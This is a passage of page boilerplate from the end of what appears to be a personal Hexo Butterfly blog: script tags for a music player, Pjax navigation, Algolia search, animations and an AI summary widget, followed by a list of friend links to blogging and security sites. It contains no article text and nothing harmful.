Waline?t():getScript("/js/waline.js").then(t)})()}};t(),document.addEventListener("pjax:complete",t)}))</script><script src="/js/jquery.min.js"></script><script src="/js/sakura.js"></script><script data-pjax="" src="/js/footer_beautification.js"></script><canvas id="universe"></canvas><script src="/js/universe.js"></script><script src="/js/title.js"></script><script async data-pjax="" src="/js/fps.js"></script><script async data-pjax="" src="/js/txmap.js"></script><script src="/js/console.js"></script><script src="/js/hotsearch.js"></script><div class="aplayer no-destroy" data-id="8252365535" data-server="netease" data-type="playlist" data-order="random" data-fixed="true" data-autoplay="false" data-theme="#00C4B6" data-volume="0.8" data-mutex="true" data-listmaxheight="330px"></div><script src="//npm.elemecdn.com/pace-js@1.2.4/pace.min.js"></script><script async data-pjax="" src="/js/timing.js"></script><script data-pjax="" src="/js/rightmenu.js"></script><script src="/js/random.js"></script><script src="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/jinrishici.js"></script><script data-pjax="" src="/js/poem.js"></script><script src="/js/chuckle-post-ai.js"></script><script data-pjax="" defer>new ChucklePostAI({el:"#post>#article-container",key:"e3524467cea76d785e9a",title_el:".post-title",interface:{name:"uf4te 的 AI 小助手",introduce:"Hey，你好！很高兴见到你！我是 uf4te 的文章辅助 AI，点击下方的按钮，我可以为你生成本文摘要、推荐相关文章（首次生成可能会比较慢，请您耐心等待一小会，谢谢理解哦~）",version:"GPT",button:["介绍自己","推荐相关文章","生成本文摘要","矩阵穿梭"]},hide_shuttle:!0,pjax:!0,summary_toggle:!1,summary_speech:!0})</script><script data-pjax="" src="/js/pagination.js"></script><script async data-pjax="" src="/js/commentsum.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="♡富强♡,♡民主♡,♡文明♡,♡和谐♡,♡自由♡,♡平等♡,♡公正♡,♡法治♡,♡爱国♡,♡敬业♡,♡诚信♡,♡友善♡" data-fontsize="16px" data-random="false" async></script><link rel="stylesheet" href="/js/APlayer/APlayer.min.css" media="print" onload='this.media="all"'><script src="/js/APlayer/APlayer.min.js"></script><script src="/js/APlayer/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors=["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"];var pjax=new Pjax({elements:'a:not([target="_blank"])',selectors:pjaxSelectors,cacheBust:!1,analytics:!1,scrollRestoration:!1});document.addEventListener("pjax:send",(function(){if(window.tocScrollFn&&window.removeEventListener("scroll",window.tocScrollFn),window.scrollCollect&&window.removeEventListener("scroll",scrollCollect),document.getElementById("rightside").style.cssText="opacity: ''; transform: ''",window.aplayers)for(let e=0;e<window.aplayers.length;e++)window.aplayers[e].options.fixed||window.aplayers[e].destroy();"object"==typeof typed&&typed.destroy();const e=document.body.classList;e.contains("read-mode")&&e.remove("read-mode"),"object"==typeof disqusjs&&disqusjs.destroy()})),document.addEventListener("pjax:complete",(function(){window.refreshFn(),document.querySelectorAll("script[data-pjax], .pjax-reload script").forEach((e=>{const t=document.createElement("script"),o=e.text||e.textContent||e.innerHTML||"";Array.from(e.attributes).forEach((e=>t.setAttribute(e.name,e.value))),t.appendChild(document.createTextNode(o)),e.parentNode.replaceChild(t,e)})),GLOBAL_CONFIG.islazyload&&window.lazyLoadInstance.update(),"function"==typeof chatBtnFn&&chatBtnFn(),"function"==typeof panguInit&&panguInit(),"function"==typeof gtag&&gtag("config","",{page_path:window.location.pathname}),"object"==typeof _hmt&&_hmt.push(["_trackPageview",window.location.pathname]),"function"==typeof loadMeting&&document.getElementsByClassName("aplayer").length&&loadMeting(),"object"==typeof Prism&&Prism.highlightAll()})),document.addEventListener("pjax:error",(e=>{404===e.request.status&&pjax.loadUrl("/404.html")}))</script><div class="pjax-reload"><script async>for(var arr=document.getElementsByClassName("recent-post-item"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__fadeInLeft"),arr[i].setAttribute("data-wow-duration","600ms"),arr[i].setAttribute("data-wow-delay","200ms"),arr[i].setAttribute("data-wow-offset","100"),arr[i].setAttribute("data-wow-iteration","1")</script><script async>for(var arr=document.getElementsByClassName("card-widget"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__fadeInRightBig"),arr[i].setAttribute("data-wow-duration",""),arr[i].setAttribute("data-wow-delay",""),arr[i].setAttribute("data-wow-offset",""),arr[i].setAttribute("data-wow-iteration","")</script></div><script defer src="https://cdn.jsdelivr.net/gh/graingert/wow@1.3.0/dist/wow.min.js"></script><script defer src="/js/wow_init.js"></script></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/algoliasearch-lite.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script></div><div class="js-pjax"><script async>for(var arr=document.getElementsByClassName("recent-post-item"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__fadeInLeft"),arr[i].setAttribute("data-wow-duration","600ms"),arr[i].setAttribute("data-wow-delay","200ms"),arr[i].setAttribute("data-wow-offset","100"),arr[i].setAttribute("data-wow-iteration","1")</script><script async>for(var arr=document.getElementsByClassName("card-widget"),i=0;i<arr.length;i++)arr[i].classList.add("wow"),arr[i].classList.add("animate__fadeInRightBig"),arr[i].setAttribute("data-wow-duration",""),arr[i].setAttribute("data-wow-delay",""),arr[i].setAttribute("data-wow-offset",""),arr[i].setAttribute("data-wow-iteration","")</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script></body></html><script>var flinks=["https://hexo.io/zh-cn/","https://nodejs.org/en/","https://butterfly.js.org/","https://cnhuazhu.top/","https://www.fomal.cc/","https://guole.fun/","https://akilar.top/","https://zykj.js.org/","https://blog.eurkon.com/","https://fe32.top/","https://blog.anheyu.com/","https://meuicat.com/","https://blog.zhheo.com/","https://blog.justlovesmile.top/","https://uuanqin.top/","https://blog.leonus.cn/","https://aeneag.xyz/","https://www.52pojie.cn/","https://www.kanxue.com/","https://www.anquanke.com/","https://www.freebuf.com/","https://blog.xmcve.com/","https://ctf-wiki.org/","https://bestwing.me/","https://houjingyi233.com/","https://paper.seebug.org/","https://security.tencent.com/index.php/blog/","https://xlab.tencent.com/cn/","https://www.ctfiot.com/blog/","https://www.iotsec-zone.com/article/original","https://www.yuque.com/cyberangel/rg9gdm/","https://www.yuque.com/u239977/","https://www.yuque.com/hxfqg9/","https://blog.aabyss.cn/","https://wiki.wgpsec.org/","https://www.cnblogs.com/trunk","https://lazzzaro.github.io/","https://zikh26.github.io/","https://bbs.kanxue.com/homepage-949925.htm","https://www.henry-blog.life/henry-blog","https://www.yuque.com/cyber1c3","https://blog.imzjw.cn/","https://zfe.space/","https://blog.hclonely.com/","https://whb1990.github.io/","https://nickxu.me/","https://benpaodewoniu.github.io/","https://www.antmoe.com/","https://immmmm.com/","https://blog.night1918.top"];function toRandomFlink(){window.open(flinks[Math.floor(Math.random()*flinks.length)])}</script>